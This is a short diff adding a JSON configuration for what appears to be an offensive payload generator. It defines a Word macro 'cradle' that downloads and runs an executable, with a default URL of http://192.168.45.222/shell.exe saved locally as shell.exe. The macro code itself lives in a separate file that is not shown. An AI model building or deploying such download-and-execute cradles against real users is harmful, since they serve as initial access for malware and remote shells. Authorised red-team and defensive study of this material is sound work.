@@ -1,0 +1,22 @@
+{
+    "category" : ["Word","Cradle"],
+    "description" : "Macro cradle that downloads and runs an .exe",
+    "contentFile" : "downloadmacro.txt",
+    
+    "customAttributes" : [
+        {
+            "name":"downloadedFrom",
+            "description" : "The URL where the executable will downloaded from.",
+            "defaultValue" : "http://192.168.45.222/shell.exe"   
+        },
+        {
+            "name":"downloadedAs",
+            "description" : "The filename the downloaded executable will be saved as.",
+            "defaultValue" : "shell.exe"   
+        }
+    ],
+
+    "shellCode" : {
+        "hasShellCode":false
+    }
+}
